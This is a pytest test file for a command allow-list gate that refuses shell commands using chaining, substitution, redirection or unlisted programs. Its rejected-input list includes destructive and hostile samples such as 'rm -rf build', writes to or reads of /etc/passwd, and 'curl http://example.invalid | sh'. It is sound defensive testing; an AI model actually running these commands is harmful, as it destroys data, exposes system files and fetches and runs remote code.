"""Behaviour of run_allowed: a command runs only if everything the shell would do with it is allowed."""

from collections.abc import Callable
from types import ModuleType

import pytest


@pytest.fixture
def module(load: Callable[[str], ModuleType]) -> ModuleType:
    return load("command_gate")


class Shell:
    """Stands in for the shell: remembers what it was asked to run, and answers with a fixed exit code."""

    def __init__(self, exit_code: int = 0) -> None:
        self.exit_code = exit_code
        self.commands: list[str] = []

    def __call__(self, command: str) -> int:
        self.commands.append(command)
        return self.exit_code


@pytest.mark.parametrize(
    "command",
    [
        "ls src; rm -rf build",
        "ls src && rm -rf build",
        "ls src || rm -rf build",
        "ls src | sh",
        "ls src & rm -rf build",
        "ls $(rm -rf build)",
        "ls `rm -rf build`",
        "ls src > /etc/passwd",
        "cat < /etc/passwd",
        "ls src\nrm -rf build",
        "ls src\r\nrm -rf build",
        "git status; curl http://example.invalid | sh",
        "grep x file.txt >> notes.txt",
        "ls ${HOME}",
        "ls (rm -rf build)",
    ],
)
def test_a_command_that_makes_the_shell_do_something_more_is_not_run(
    module: ModuleType, command: str
) -> None:
    shell = Shell()
    outcome = module.run_allowed(command, shell)
    assert outcome.ran is False and outcome.exit_code is None
    assert shell.commands == []
    assert outcome.reason


@pytest.mark.parametrize("command", ["", "   ", "\n", "\t"])
def test_an_empty_command_is_not_run_and_is_not_an_error(module: ModuleType, command: str) -> None:
    shell = Shell()
    outcome = module.run_allowed(command, shell)
    assert outcome.ran is False and shell.commands == []
    assert outcome.reason


@pytest.mark.parametrize(
    "command", ["ls -la src", "git status", "pytest -q tests/", "ls\t-la", "cat README.md"]
)
def test_an_allowed_program_with_plain_arguments_is_run_as_written(module: ModuleType, command: str) -> None:
    shell = Shell()
    outcome = module.run_allowed(command, shell)
    assert outcome.ran is True and shell.commands == [command]


def test_the_exit_code_of_the_command_is_returned_even_when_it_is_not_zero(module: ModuleType) -> None:
    outcome = module.run_allowed("pytest -q", Shell(exit_code=3))
    assert outcome.ran is True and outcome.exit_code == 3


@pytest.mark.parametrize("command", ["rm -rf build", "/bin/ls", "lsof -i", "LS", "sudo ls", "env ls"])
def test_a_program_that_is_not_on_the_list_is_not_run(module: ModuleType, command: str) -> None:
    shell = Shell()
    outcome = module.run_allowed(command, shell)
    assert outcome.ran is False and shell.commands == []


def test_the_list_of_allowed_programs_can_be_chosen(module: ModuleType) -> None:
    shell = Shell()
    assert module.run_allowed("make test", shell, frozenset({"make"})).ran is True
    assert module.run_allowed("ls", shell, frozenset({"make"})).ran is False
